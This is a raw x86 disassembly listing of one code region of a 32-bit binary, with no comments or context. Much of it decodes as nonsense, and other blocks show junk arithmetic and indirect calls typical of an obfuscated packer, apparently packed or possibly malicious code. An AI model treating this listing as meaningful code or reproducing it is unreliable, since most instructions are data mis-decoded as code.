  402216:	cmp    DWORD PTR [ebp-0xf],ecx
  402219:	idiv   DWORD PTR [eax-0x3]
  40221c:	pop    edx
  40221d:	inc    edi
  40221e:	xchg   esi,eax
  40221f:	mov    edi,DWORD PTR [ebp+0x2]
  402222:	push   ebp
  402223:	jnp    0x402222
  402225:	cmp    al,0xe7
  402227:	sub    edi,edx
  402229:	test   DWORD PTR [esi-0x748f2f3a],ebp
  40222f:	dec    esi
  402230:	retf   
  402231:	fisubr WORD PTR [eax+0x4d]
  402234:	js     0x4021f5
  402236:	push   ebx
  402237:	xchg   DWORD PTR [edi],ebx
  402239:	cdq    
  40223a:	add    BYTE PTR [ebx+0xca59160],dh
  402240:	aam    0x3c
  402242:	outs   dx,DWORD PTR ds:[esi]
  402243:	mov    ds:0x51924d29,eax
  402248:	dec    edx
  402249:	add    esi,DWORD PTR [edx]
  40224b:	js     0x402238
  40224d:	add    bl,dl
  40224f:	and    DWORD PTR [eax+0x4e],0xffffffcc
  402253:	mov    dh,0xc7
  402255:	mov    bl,0xe1
  402257:	sbb    al,0xb8
  402259:	mov    ebp,0xf2cdabe6
  40225e:	jns    0x4022a6
  402260:	jbe    0x40222f
  402262:	or     eax,ebp
  402264:	adc    edi,DWORD PTR [ecx]
  402266:	sbb    ecx,DWORD PTR [edx+0x3f6bd311]
  40226c:	mov    eax,0xb7b4a555
  402271:	jle    0x402283
  402273:	sbb    al,BYTE PTR [edx]
  402275:	icebp  
  402276:	sbb    DWORD PTR [esi+0x5993a00],esp
  40227c:	retf   0x3cc9
  40227f:	sbb    DWORD PTR [edi-0x7e],0xffffff90
  402283:	imul   ebx,DWORD PTR [ebx+edi*2-0x7e],0x37
  402288:	stos   DWORD PTR es:[edi],eax
  402289:	pop    ecx
  40228a:	mov    es,eax
  40228c:	setae  BYTE PTR [ebx-0x6f]
  402290:	arpl   bp,ax
  402292:	cmc    
  402293:	mov    dl,BYTE PTR [ebx+0x18]
  402296:	inc    esi
  402297:	iret   
  402298:	fstp   TBYTE PTR ds:0xb6e4d844
  40229e:	je     0x402304
  4022a0:	pop    es
  4022a1:	hlt    
  4022a2:	pop    ebp
  4022a3:	std    
  4022a4:	ja     0x4022e1
  4022a6:	inc    edi
  4022a7:	mov    es,WORD PTR [ecx-0x46]
  4022aa:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4022ac:	sbb    al,0xa0
  4022ae:	fimul  DWORD PTR [eax+edi*1]
  4022b1:	jb     0x402318
  4022b3:	xor    al,0x45
  4022b5:	out    dx,al
  4022b6:	iret   
  4022b7:	fmul   QWORD PTR ds:0xf31fccb
  4022bd:	rol    BYTE PTR [ebp+0x52ee82d6],1
  4022c3:	stc    
  4022c4:	into   
  4022c5:	leave  
  4022c6:	mov    BYTE PTR [eax-0x6489fd10],al
  4022cc:	test   eax,0x5f04c6e0
  4022d1:	addr16 out dx,eax
  4022d3:	(bad)  
  4022d4:	call   0xceef:0xda82f526
  4022db:	outs   dx,DWORD PTR ds:[esi]
  4022dc:	(bad)  
  4022dd:	hlt    
  4022de:	inc    edx
  4022df:	out    0xa2,eax
  4022e1:	pop    ds
  4022e2:	push   eax
  4022e3:	fnsave [ebx-0x6bc8e8af]
  4022e9:	jae    0x40233e
  4022eb:	fisub  DWORD PTR [edi+eiz*4-0x19]
  4022ef:	mov    ds:0x5fec9cfe,al
  4022f4:	xchg   ebx,eax
  4022f5:	fwait
  4022f6:	inc    ebp
  4022f7:	leave  
  4022f8:	jmp    0x905c:0x77db28f3
  4022ff:	popa   
  402300:	mov    ch,0xcd
  402302:	add    eax,0x11c5a70
  402307:	xchg   DWORD PTR [eax+0x7e],edi
  40230a:	sti    
  40230b:	test   BYTE PTR [ecx+0xa],ch
  40230e:	cld    
  40230f:	leave  
  402310:	pushf  
  402311:	adc    eax,0xe861405e
  402316:	adc    eax,DWORD PTR [ebp+0x5c81e95]
  40231c:	adc    BYTE PTR [eax+eiz*8-0x794897d5],ah
  402323:	scas   al,BYTE PTR es:[edi]
  402324:	out    dx,al
  402325:	push   eax
  402326:	enter  0x92fb,0xa8
  40232a:	push   edi
  40232b:	repnz xacquire xchg BYTE PTR ds:[esi+0x5e],cl
  402331:	push   edx
  402332:	retf   
  402333:	adc    edi,DWORD PTR [eax+0x1c]
  402336:	mov    al,ds:0xffe1f97e
  40233b:	scas   al,BYTE PTR es:[edi]
  40233c:	xor    eax,0x1d4b0322
  402341:	push   0xffffffbb
  402343:	inc    eax
  402344:	repz ja 0x4023af
  402347:	or     eax,0x768c4aeb
  40234c:	mov    bl,0xe0
  40234e:	out    0x1a,al
  402350:	cli    
  402351:	es adc al,0x54
  402354:	shrd   edi,eax,cl
  402357:	jb     0x40233d
  402359:	loopne 0x40236e
  40235b:	sub    al,0xff
  40235d:	pop    ss
  40235e:	xor    ecx,DWORD PTR [edx]
  402360:	xchg   ebx,eax
  402361:	pop    ebx
  402362:	retf   0xd7c3
  402365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402366:	mov    eax,0xc0740d66
  40236b:	add    DWORD PTR [esi-0x3f],esi
  40236e:	mov    eax,es
  402370:	jle    0x402388
  402372:	popa   
  402373:	push   ebx
  402374:	pop    es
  402375:	rcr    DWORD PTR [edi],cl
  402377:	push   ds
  402378:	ss sbb ecx,edx
  40237b:	jle    0x402341
  40237d:	call   0xc3ecb588
  402382:	xchg   ebx,eax
  402383:	add    bl,BYTE PTR [edi+ebx*1+0x62]
  402387:	push   esi
  402388:	pusha  
  402389:	push   ebx
  40238a:	mov    ah,0x2a
  40238c:	jns    0x4023cc
  40238e:	pusha  
  40238f:	shl    DWORD PTR [ebp-0x269b195b],0xae
  402396:	(bad)
  40239a:	test   BYTE PTR [esi],cl
  40239c:	mul    BYTE PTR [edx-0x1d]
  40239f:	mov    al,0x7f
  4023a1:	adc    cl,dh
  4023a3:	popfw  
  4023a5:	jp     0x402330
  4023a7:	and    dl,BYTE PTR [edi]
  4023a9:	mov    ecx,0x8dc78008
  4023ae:	aas    
  4023af:	jae    0x402369
  4023b1:	mov    esi,0x243b458
  4023b6:	shl    DWORD PTR [edx],cl
  4023b8:	cmp    DWORD PTR [ecx+0x294d117],ebp
  4023be:	mov    ecx,?
  4023c0:	mov    cl,0xa6
  4023c2:	popa   
  4023c3:	inc    esp
  4023c4:	lods   al,BYTE PTR ds:[esi]
  4023c5:	mov    ebx,0xb3d83683
  4023ca:	adc    esi,DWORD PTR [ecx+edi*1-0x1e6ce09c]
  4023d1:	sbb    BYTE PTR fs:[edi],dh
  4023d4:	jns    0x4023c4
  4023d6:	dec    esp
  4023d7:	dec    edx
  4023d8:	sbb    BYTE PTR [ecx],cl
  4023da:	dec    BYTE PTR [edx+0x4bfb1f0f]
  4023e0:	cmp    BYTE PTR [ecx+0x1a84a7b],cl
  4023e6:	in     eax,dx
  4023e7:	in     eax,dx
  4023e8:	shl    BYTE PTR [ebx-0x9bd2284],1
  4023ee:	aad    0x64
  4023f0:	in     eax,dx
  4023f1:	jg     0x40240f
  4023f3:	jmp    0x40238b
  4023f5:	das    
  4023f6:	xchg   ebp,eax
  4023f7:	call   0x68ef:0x6747a034
  4023fe:	cvtps2pi mm0,QWORD PTR [eax]
  402401:	add    BYTE PTR [ecx+0x4283e91d],al
  402407:	add    BYTE PTR [ecx],dl
  402409:	test   BYTE PTR [edx+0x0],al
  40240c:	call   0x422239
  402411:	mov    ecx,DWORD PTR [ebp-0x68]
  402414:	mov    edx,DWORD PTR ds:0x428409
  40241a:	add    DWORD PTR ds:0x428325,edx
  402420:	mov    edx,DWORD PTR [ebp-0x64]
  402423:	sub    DWORD PTR ds:0x4284f5,ecx
  402429:	xor    eax,ecx
  40242b:	sub    DWORD PTR ds:0x42848d,edi
  402431:	mov    ecx,DWORD PTR [ebp-0x70]
  402434:	mov    edx,DWORD PTR [ebp-0x6c]
  402437:	neg    DWORD PTR ds:0x42852d
  40243d:	sub    eax,ecx
  40243f:	mov    ecx,DWORD PTR ds:0x4226e8
  402445:	lea    eax,[eax+ecx*1-0x27d2]
  40244c:	not    edx
  40244e:	mov    ecx,DWORD PTR [ebp-0x1c]
  402451:	adc    edx,DWORD PTR ds:0x428475
  402457:	mov    edx,DWORD PTR [ebp-0x2c]
  40245a:	neg    DWORD PTR ds:0x4283ed
  402460:	or     ecx,0x4f00
  402466:	and    ecx,edx
  402468:	cmp    DWORD PTR ds:0x4282dd,0x0
  40246f:	mov    DWORD PTR ds:0x4284f9,ebx
  402475:	mov    edx,DWORD PTR ds:0x4283f5
  40247b:	jmp    0x4024db
  402480:	mov    DWORD PTR ds:0x4283d5,0xc4d
  40248a:	cmp    DWORD PTR ds:0x4282dd,0x0
  402491:	jg     0x4024b5
  402497:	push   DWORD PTR [ebp-0x24]
  40249a:	push   DWORD PTR [ebp-0x28]
  40249d:	call   DWORD PTR ds:0x42dfe8
  4024a3:	xor    edx,DWORD PTR ds:0x4283d1
  4024a9:	adc    DWORD PTR ds:0x42849d,ecx
  4024af:	add    edx,0x747e
  4024b5:	or     DWORD PTR ds:0x4284fd,0x36ec
  4024bf:	neg    DWORD PTR ds:0x4284f5
  4024c5:	adc    edx,DWORD PTR ds:0x4282f1
  4024cb:	sbb    DWORD PTR ds:0x428531,edi
  4024d1:	sbb    DWORD PTR ds:0x4284fd,0x669d
  4024db:	mov    edx,DWORD PTR [ebp-0x34]
  4024de:	or     ecx,edx
  4024e0:	xor    ecx,0x5fdd
  4024e6:	cmp    ecx,DWORD PTR [eax]
  4024e8:	mov    DWORD PTR ds:0x4284a1,0x2fd8
  4024f2:	jne    0x408bb3
  4024f8:	mov    ecx,DWORD PTR [esi]
  4024fa:	cmp    DWORD PTR ds:0x4284b1,0x0
  402501:	mov    DWORD PTR ds:0x4283c5,edi
  402507:	not    edx
  402509:	mov    DWORD PTR ds:0x4284a1,0x71cc
  402513:	jmp    0x402572
  402518:	mov    eax,ds:0x4284b1
  40251d:	mov    eax,0x2d63
  402522:	cmp    DWORD PTR ds:0x4284b1,0x0
  402529:	je     0x40255f
  40252f:	push   0x428319
  402534:	push   DWORD PTR [ebp-0x18]
  402537:	push   0x428205
  40253c:	push   0x6ba7
  402541:	call   DWORD PTR ds:0x42dfec
  402547:	sbb    edx,DWORD PTR ds:0x428325
  40254d:	xor    edx,DWORD PTR ds:0x42831d
  402553:	and    edx,edx
  402555:	mov    DWORD PTR ds:0x4283d9,0x7db9
  40255f:	add    DWORD PTR ds:0x428415,edx
  402565:	inc    edx
  402566:	and    DWORD PTR ds:0x4282e9,ecx
  40256c:	or     DWORD PTR ds:0x428431,ecx
  402572:	mov    eax,DWORD PTR [esi+0x4]
  402575:	shrd   ecx,eax,0x2
  402579:	shr    eax,0x2
  40257c:	adc    DWORD PTR ds:0x428321,ecx
  402582:	mov    eax,DWORD PTR [esi]
  402584:	movzx  edx,BYTE PTR ds:0x4283e1
  40258b:	or     DWORD PTR ds:0x428515,edx
  402591:	mov    edx,DWORD PTR [esi+0x4]
  402594:	shl    eax,0x1e
  402597:	xor    ecx,edi
  402599:	xor    eax,eax
  40259b:	or     eax,ecx
  40259d:	jmp    0x40293e
  4025a2:	cmp    al,0x5
  4025a4:	ja     0x4025d8
  4025a6:	jl     0x40255c
  4025a8:	mov    esp,0xb45d5307
  4025ad:	iret   
  4025ae:	cli    
  4025af:	inc    esp
  4025b0:	sar    DWORD PTR es:[esi-0x42414126],1
  4025b7:	les    edi,FWORD PTR [esi+0x68df66be]
  4025bd:	fstp   TBYTE PTR [eax]
  4025bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c0:	and    esp,ecx
  4025c2:	cmc    
  4025c3:	pop    esp
  4025c4:	imul   BYTE PTR [ebx+0x565e2ffa]
  4025ca:	pop    esp
  4025cb:	add    dh,BYTE PTR [edx]
  4025cd:	stos   DWORD PTR es:[edi],eax
  4025ce:	jmp    0x4025c5
  4025d0:	or     ecx,DWORD PTR [edx+0x6b]
  4025d3:	enter  0x5b93,0xff
  4025d7:	test   al,0xcd
  4025d9:	cmp    BYTE PTR [edx+esi*2+0x75],ah
  4025dd:	mov    DWORD PTR [esi+0x38],esp
  4025e0:	sar    BYTE PTR [edx+0x62],1
  4025e3:	mov    eax,ds:0x2cd50303
  4025e8:	mov    WORD PTR [edx],gs
  4025ea:	xor    eax,0x8e6a121b
  4025ef:	push   es
  4025f0:	xchg   ebp,eax
  4025f1:	test   eax,0x6b4a9f42
  4025f6:	add    al,0xc2
  4025f8:	imul   ebx,edx,0xffffffd2
  4025fb:	popa   
  4025fc:	adc    al,BYTE PTR [ebx+ebx*4-0x7b]
  402600:	xor    BYTE PTR [edi+0x28],cl
  402603:	add    al,BYTE PTR [ebx]
  402605:	sub    dh,bl
  402607:	and    DWORD PTR [ecx-0x77],0x73
  40260b:	dec    eax
  40260c:	icebp  
  40260d:	aas    
  40260e:	sub    al,0x3f
  402610:	sbb    eax,DWORD PTR [ebx+0x6bea061f]
  402616:	cmp    BYTE PTR [eax+eiz*1],bh
  402619:	in     eax,dx
  40261a:	(bad)  
  40261b:	fmul   QWORD PTR [ebx+0x71]
  40261e:	or     al,0xd9
  402620:	idiv   DWORD PTR [edi+0x48]
  402623:	cmp    BYTE PTR [esp+esi*2-0x5613911f],bl
  40262a:	mov    al,ds:0x5c6dfbac
  40262f:	out    0x90,eax
  402631:	dec    eax
  402632:	out    dx,al
  402633:	test   eax,0x5e5375f3
  402638:	pop    ebp
  402639:	mov    bh,0x6d
  40263b:	mov    esi,0x5cfcceaf
  402640:	and    al,0x62
  402642:	test   DWORD PTR [ebx-0x66],0x8cb23af
  402649:	xlat   BYTE PTR ds:[ebx]
  40264a:	sbb    al,0xe9
  40264c:	int3   
  40264d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40264e:	inc    ecx
  40264f:	enter  0xaffc,0x2
  402653:	imul   esp,ebx,0xe688563b
  402659:	mov    ebp,0xbb7e54dd
  40265e:	fisttp DWORD PTR [ecx+0x0]
  402661:	out    0x6e,al
  402663:	ja     0x402665
  402665:	mov    edi,0x976fb61e
  40266a:	add    al,0x10
  40266c:	test   BYTE PTR [ebx-0x40],ah
  40266f:	sub    eax,0x3920fa5c
  402674:	add    eax,0x9655e6e
  402679:	mov    ds:0xf48e19d6,eax
  40267e:	js     0x402609
  402680:	mov    ch,0x73
  402682:	adc    al,0x6
  402684:	nop
  402685:	frstor [ebp-0x4f]
  402688:	jns    0x402617
  40268a:	in     al,dx
  40268b:	add    al,0xa7
  40268d:	call   0x2adc:0xf297dad9
  402694:	pop    edi
  402695:	mov    edx,0x62aad26
  40269a:	adc    DWORD PTR [ebx],eax
  40269c:	push   0x77111964
  4026a1:	xor    DWORD PTR [esi],esp
  4026a3:	mov    ecx,0x11cea160
  4026a8:	jmp    0xdc1d:0xb55abcd1
  4026af:	add    al,0xf3
  4026b1:	push   ebx
  4026b2:	repz push esi
  4026b4:	ror    DWORD PTR [edx-0x70f1313b],0x3
  4026bb:	push   0x56
  4026bd:	inc    ebp
  4026be:	pusha  
  4026bf:	loope  0x40270b
  4026c1:	mov    edx,0xfb549afe
  4026c6:	mov    eax,0xc1f36b02
  4026cb:	shr    DWORD PTR [ebp+0x5e],1
  4026ce:	int    0x47
  4026d0:	adc    dl,al
  4026d2:	mov    BYTE PTR [eax+0x37377fab],ah
  4026d8:	add    edx,DWORD PTR [ecx+0x3a4cbf6f]
  4026de:	fwait
  4026df:	and    ah,al
  4026e1:	repnz loope 0x4026ba
  4026e4:	mov    dl,0x2f
  4026e6:	aam    0x92
  4026e8:	push   0xffffff82
  4026ea:	clc    
  4026eb:	pop    esp
  4026ec:	mov    ecx,0xa971fb86
  4026f1:	mov    ah,0xbe
  4026f3:	or     cl,BYTE PTR [ebx+0x597bf468]
  4026f9:	jb     0x40269c
  4026fb:	mov    edi,0xe95f063b
  402701:	stc    
  402702:	inc    esi
  402703:	repnz or DWORD PTR [ecx],esp
  402706:	rcr    ebp,1
  402708:	(bad)  
  402709:	dec    edi
  40270a:	in     eax,dx
  40270b:	pop    es
  40270c:	push   eax
  40270d:	lahf   
  40270e:	push   ds
  40270f:	daa    
  402710:	cli    
  402711:	xchg   edi,eax
  402712:	arpl   WORD PTR [esi],ax
  402714:	inc    edx
  402715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402716:	shr    DWORD PTR ds:0x1e8eeb33,1
  40271c:	mov    DWORD PTR [edi],esp
  40271e:	call   0xbec6:0x24eddc49
  402725:	cs jmp 0x402797
  402728:	(bad)  
  402729:	fiadd  WORD PTR [ebp+0x1ed99339]
  40272f:	rol    DWORD PTR [edi],0x47
  402732:	(bad)  
  402733:	loope  0x402751
  402735:	pop    edi
  402736:	inc    ebx
  402737:	in     al,dx
  402738:	mov    esp,0x365bdcf2
  40273d:	xchg   edi,eax
  40273e:	dec    edx
  40273f:	call   eax
  402741:	push   0xa440b08b
  402746:	shr    DWORD PTR [edi+0x1d],cl
  402749:	addr16 popa 
  40274b:	and    al,0x15
  40274d:	cdq    
  40274e:	pop    ebx
  40274f:	scas   eax,DWORD PTR es:[edi]
  402750:	push   esp
  402751:	jmp    0xf5ec3a8a
  402756:	jmp    0x402702
  402758:	jb     0x4027a3
  40275a:	iret   
  40275b:	push   eax
  40275c:	hlt    
  40275d:	lods   eax,DWORD PTR ds:[esi]
  40275e:	push   esi
  40275f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402760:	es icebp 
  402762:	cmp    BYTE PTR [ebx+0x71],ah
  402765:	sbb    bl,BYTE PTR [eax+ebp*1+0x66676192]
  40276c:	scas   eax,DWORD PTR es:[edi]
  40276d:	jnp    0x402777
  40276f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402770:	arpl   sp,bp
  402772:	mov    al,0x56
  402774:	dec    edi
  402775:	push   ds
  402776:	and    eax,0x2a093c72
  40277b:	mov    ebp,0x87bec981
  402780:	outs   dx,BYTE PTR ds:[esi]
  402781:	push   edi
  402782:	and    BYTE PTR [edi+0xaa7baf6],dl
  402788:	add    BYTE PTR [ecx+ebp*1-0x38b85319],0x7b
  402790:	sbb    DWORD PTR [esi-0x7a],0x63cbaadf
  402797:	pop    ebx
  402798:	repnz mov al,ds:0xe9f287db
  40279e:	aaa    
  40279f:	dec    edi
  4027a0:	lock cmp BYTE PTR [ebp-0x32],dh
  4027a4:	mov    cl,0xba
  4027a6:	xchg   DWORD PTR [edx*8-0x420fad3e],ebp
  4027ad:	or     BYTE PTR [edx-0x73],al
  4027b0:	inc    eax
  4027b1:	into   
  4027b2:	pop    ds
  4027b3:	jno    0x402766
  4027b5:	inc    esi
  4027b6:	leave  
  4027b7:	(bad)  
  4027b8:	sbb    BYTE PTR [eax-0x2bd16348],0xec
  4027bf:	and    ecx,DWORD PTR [edi]
  4027c1:	ins    BYTE PTR es:[edi],dx
  4027c2:	pop    eax
  4027c3:	xchg   edx,eax
  4027c4:	fs pop ss
  4027c6:	je     0x4027fb
  4027c8:	popa   
  4027c9:	js     0x4027f1
  4027cb:	add    al,0xa4
  4027cd:	(bad)  
  4027ce:	std    
  4027cf:	or     al,0x10
  4027d1:	in     al,0x1e
  4027d3:	icebp  
  4027d4:	pushf  
  4027d5:	mov    ebp,0x1571796b
  4027da:	sbb    eax,0xfb4eaa92
  4027df:	or     bh,cl
  4027e1:	dec    esp
  4027e2:	stc    
  4027e3:	pop    edi
  4027e4:	imul   edx,DWORD PTR [edx-0x6a0be50b],0xffffffdb
  4027eb:	mov    fs,WORD PTR [bx+di]
  4027ee:	jae    0x4027bb
  4027f0:	setnp  BYTE PTR [edi+edi*1-0xd]
  4027f5:	int3   
  4027f6:	jbe    0x402850
  4027f8:	stc    
  4027f9:	unpckhps xmm0,XMMWORD PTR [ecx]
  4027fc:	stos   DWORD PTR es:[edi],eax
  4027fd:	shl    dh,cl
  4027ff:	mov    bh,0xe6
  402801:	or     ebp,edx
  402803:	sbb    al,0xbb
  402805:	rol    BYTE PTR [eax+0x3f],cl
  402808:	pop    edi
  402809:	pushf  
  40280a:	mov    ebp,0x54521422
  40280f:	dec    ebx
  402810:	cmc    
  402811:	shr    BYTE PTR [eax+0x7d0b2fa1],1
  402817:	sar    DWORD PTR [eax-0x8],0x99
  40281b:	lea    eax,[eax]
  40281d:	arpl   bp,bx
  40281f:	scas   eax,DWORD PTR es:[edi]
  402820:	mov    ss,WORD PTR ds:0x80eb2b6a
  402826:	push   esi
  402827:	or     bh,al
  402829:	sahf   
  40282a:	int3   
  40282b:	clc    
  40282c:	sub    BYTE PTR [ebp-0x36],ah
  40282f:	repnz sub BYTE PTR [edx],bl
  402832:	out    0x59,al
  402834:	(bad)  
  402835:	bnd jmp 0x1cd55d66
  40283b:	and    eax,0xdadea81f
  402840:	test   DWORD PTR [ebp-0x11],eax
  402843:	xlat   BYTE PTR ds:[ebx]
  402844:	mov    DWORD PTR [ecx-0x26066eb9],eax
  40284a:	(bad)  
  40284b:	jmp    0x4028c2
  40284d:	jae    0x402833
  40284f:	jle    0x402861
  402851:	jp     0xe16f6cca
  402857:	jne    0x4028b5
  402859:	jne    0x402852
  40285b:	push   ebx
  40285c:	test   DWORD PTR [ebx-0x53],eax
  40285f:	mov    ebp,0x48d57014
  402864:	xor    DWORD PTR [ecx+ebp*2+0x66c7aebc],esi
  40286b:	or     dh,cl
  40286d:	mov    eax,ds:0x33de4b55
  402872:	add    BYTE PTR [edi-0x49],0x8a
  402876:	adc    BYTE PTR [ecx],bh
  402878:	fs ret 
  40287a:	(bad)  
  40287b:	jb     0x402899
  40287d:	jmp    0x4028b7
  40287f:	loope  0x402812
  402881:	and    BYTE PTR [edi],al
  402883:	(bad)  
  402884:	xchg   ecx,eax
  402885:	mov    ecx,0x96fb82b0
  40288a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40288b:	scas   eax,DWORD PTR es:[edi]
  40288c:	xor    dl,BYTE PTR ds:0x947a27d1
  402892:	and    bl,ch
  402894:	mov    al,ds:0xc43a08d0
  402899:	xchg   esp,eax
  40289a:	call   0xa884:0x5e3bea1b
  4028a1:	sub    eax,0x99c8f0a8
  4028a6:	aaa    
  4028a7:	and    ebx,0xfbafd732
  4028ad:	jp     0x40289f
  4028af:	dec    ecx
  4028b0:	(bad)  
  4028b1:	icebp  
  4028b2:	fidivr DWORD PTR [eax+edi*4+0x45d2ba4e]
  4028b9:	es bt  ecx,ecx
  4028bd:	mov    ds:0xf1f6471c,eax
  4028c2:	lds    edi,FWORD PTR [edi+0x71]
  4028c5:	inc    esp
  4028c6:	dec    ebx
  4028c7:	mov    esp,DWORD PTR [edx]
  4028c9:	jmp    0xfa50:0x2821623e
  4028d0:	jg     0x4028d5
  4028d2:	xlat   BYTE PTR ds:[ebx]
  4028d3:	ss inc ebx
  4028d5:	add    BYTE PTR [edi+edi*8+0x57],ch
  4028d9:	rcr    DWORD PTR [esi+0x738beec2],cl
  4028df:	hlt    
  4028e0:	or     BYTE PTR [edx+0xb6ff4a3],ch
  4028e6:	es push es
  4028e8:	jo     0x402955
  4028ea:	test   eax,0x369ec48d
  4028ef:	leave  
  4028f0:	(bad)  
  4028f1:	or     edi,DWORD PTR [ebp+0x45]
  4028f4:	lds    edi,FWORD PTR [edx]
  4028f6:	(bad)  
  4028f8:	mov    al,0x6
  4028fa:	xor    esi,DWORD PTR [eax-0x45]
  4028fd:	(bad)  
  4028fe:	pop    ecx
  4028ff:	xor    BYTE PTR [ebp-0x5f],0xec
  402903:	xor    al,BYTE PTR [edi]
  402905:	fstp   DWORD PTR [edi]
  402907:	pop    ds
  402908:	push   ds
  402909:	pushf  
  40290a:	repnz mov edx,0x2a7ee752
  402910:	inc    ecx
  402911:	inc    eax
  402912:	mov    ds:0xebf1752a,al
  402917:	std    
  402918:	ins    BYTE PTR es:[edi],dx
  402919:	and    edi,DWORD PTR [bp+di]
  40291c:	and    ch,BYTE PTR [eax-0x37]
  40291f:	sar    dh,0x27
  402922:	out    dx,al
  402923:	data16 mov dl,0xc1
  402926:	xor    DWORD PTR [ebx-0x30],edi
  402929:	pop    ds
  40292a:	jle    0x402934
  40292c:	ds mov cl,0x58
  40292f:	ds mov gs,ebp
  402932:	xor    DWORD PTR [ebx+0x5a],ecx
  402935:	push   ecx
  402936:	fistp  QWORD PTR [edx]
  402938:	or     BYTE PTR [eax-0x15],cl
  40293b:	scas   al,BYTE PTR es:[edi]
  40293c:	pop    ebp
  40293d:	ins    DWORD PTR es:[edi],dx
  40293e:	mov    ecx,DWORD PTR [ebp-0x14]
  402941:	cmp    eax,DWORD PTR [ecx]
  402943:	mov    DWORD PTR ds:0x4283d9,0x7e19
  40294d:	jne    0x402a3a
  402953:	cmp    DWORD PTR ds:0x4284a1,0x0
  40295a:	mov    DWORD PTR ds:0x4284f5,edi
  402960:	mov    ecx,0x5bac
  402965:	mov    ecx,0x785
  40296a:	jmp    0x4029c0
  40296f:	mov    DWORD PTR ds:0x4284a5,0x7d3d
  402979:	mov    eax,ds:0x428301
  40297e:	cmp    DWORD PTR ds:0x4284a1,0x0
  402985:	jl     0x4029a6
  40298b:	push   0x25e9
  402990:	call   DWORD PTR ds:0x42e238
  402996:	and    ecx,0x7efc
  40299c:	and    DWORD PTR ds:0x428431,0x428319
  4029a6:	sub    edx,edx
  4029a8:	and    DWORD PTR ds:0x428505,0x3b56
  4029b2:	mov    edx,DWORD PTR ds:0x4284dd
  4029b8:	mov    edx,DWORD PTR [edx]
  4029ba:	add    DWORD PTR ds:0x4283f5,edx
  4029c0:	mov    eax,DWORD PTR [ebp-0xc]
  4029c3:	mov    ecx,DWORD PTR [ebp+0x20]
  4029c6:	sub    DWORD PTR ds:0x428325,edi
  4029cc:	xor    DWORD PTR [eax],ecx
  4029ce:	mov    eax,DWORD PTR [ebp-0xc]
  4029d1:	or     edx,ecx
  4029d3:	mov    ecx,DWORD PTR [ebp+0x18]
  4029d6:	or     DWORD PTR ds:0x428401,ebx
  4029dc:	mov    edx,DWORD PTR [ebp+0x1c]
  4029df:	add    DWORD PTR ds:0x4282fd,0x2a87
  4029e9:	shrd   ecx,edx,0x2
  4029ed:	sub    DWORD PTR ds:0x42840d,0x4283e5
  4029f7:	mov    DWORD PTR [ebp-0x14],ecx
  4029fa:	mov    ecx,DWORD PTR [ebp+0x18]
  4029fd:	xor    DWORD PTR [ebp-0x14],edi
  402a00:	shr    edx,0x2
  402a03:	xor    edx,0x4270
  402a09:	mov    edx,DWORD PTR [ebp+0x1c]
  402a0c:	sbb    DWORD PTR ds:0x4283b9,0x4283d5
  402a16:	xor    edx,edx
  402a18:	and    DWORD PTR ds:0x428529,0x4282e1
  402a22:	or     edx,DWORD PTR [ebp-0x14]
  402a25:	or     DWORD PTR ds:0x428401,0x6ae7
  402a2f:	shl    ecx,0x1e
  402a32:	xor    DWORD PTR ds:0x428319,edx
  402a38:	sub    DWORD PTR [eax],edx
  402a3a:	xor    ecx,ecx
  402a3c:	add    ecx,DWORD PTR ds:0x428471
  402a42:	mov    eax,ds:0x4284e9
  402a47:	sub    eax,ecx
  402a49:	add    ecx,DWORD PTR [ecx+eax*1]
  402a4c:	mov    eax,ds:0x422530
  402a51:	add    edx,DWORD PTR ds:0x428315
  402a57:	mov    ecx,DWORD PTR [ebp-0xc]
  402a5a:	cmp    DWORD PTR ds:0x4283c9,0x0
  402a61:	not    edx
  402a63:	not    DWORD PTR ds:0x4282fd
  402a69:	movzx  edx,WORD PTR ds:0x4282ed
  402a70:	jmp    0x402ae1
  402a75:	mov    edx,0x6743
  402a7a:	cmp    DWORD PTR ds:0x4283c9,0x0
  402a81:	jg     0x402ac1
  402a87:	push   0x8e71
  402a8c:	push   DWORD PTR [ebp-0x1c]
  402a8f:	call   DWORD PTR ds:0x42dff0
  402a95:	movzx  edx,WORD PTR ds:0x428419
  402a9c:	sbb    edx,DWORD PTR ds:0x428511
  402aa2:	mov    DWORD PTR ds:0x428419,edx
  402aa8:	movzx  edx,BYTE PTR ds:0x428421
  402aaf:	adc    DWORD PTR ds:0x4284f9,edx
  402ab5:	or     edx,0x3af6
  402abb:	and    edx,DWORD PTR ds:0x4282dd
  402ac1:	or     DWORD PTR ds:0x428319,0x67f9
  402acb:	add    edx,0x3b45
  402ad1:	or     edx,DWORD PTR ds:0x428481
  402ad7:	adc    DWORD PTR ds:0x4284f9,0x3eb0
  402ae1:	mov    eax,DWORD PTR [eax]
  402ae3:	cmp    DWORD PTR ds:0x428301,0x0
  402aea:	mov    DWORD PTR ds:0x428489,0xab9
  402af4:	mov    edx,DWORD PTR ds:0x42831d
  402afa:	mov    DWORD PTR ds:0x4282f1,0x238f
  402b04:	jmp    0x402b79
  402b09:	mov    DWORD PTR ds:0x428525,ecx
  402b0f:	cmp    DWORD PTR ds:0x428301,0x0
  402b16:	ja     0x402b5f
  402b1c:	push   DWORD PTR [ebp-0x14]
  402b1f:	push   0x428141
  402b24:	push   DWORD PTR [ebp-0x10]
  402b27:	push   0x4281e8
  402b2c:	push   DWORD PTR [ebp-0x18]
  402b2f:	push   0x24b6
  402b34:	call   DWORD PTR ds:0x42e23c
  402b3a:	mov    edx,DWORD PTR ds:0x428325
  402b40:	sub    DWORD PTR ds:0x42830d,edx
  402b46:	sbb    DWORD PTR ds:0x4283f9,ebx
  402b4c:	movzx  edx,BYTE PTR ds:0x4282dd
  402b53:	adc    DWORD PTR ds:0x42841d,edx
  402b59:	add    DWORD PTR ds:0x42851d,ebx
  402b5f:	xor    edx,edx
  402b61:	or     edx,DWORD PTR ds:0x42852d
  402b67:	xor    edx,DWORD PTR ds:0x428495
  402b6d:	mov    DWORD PTR ds:0x42852d,edx
  402b73:	add    edx,0x71a6
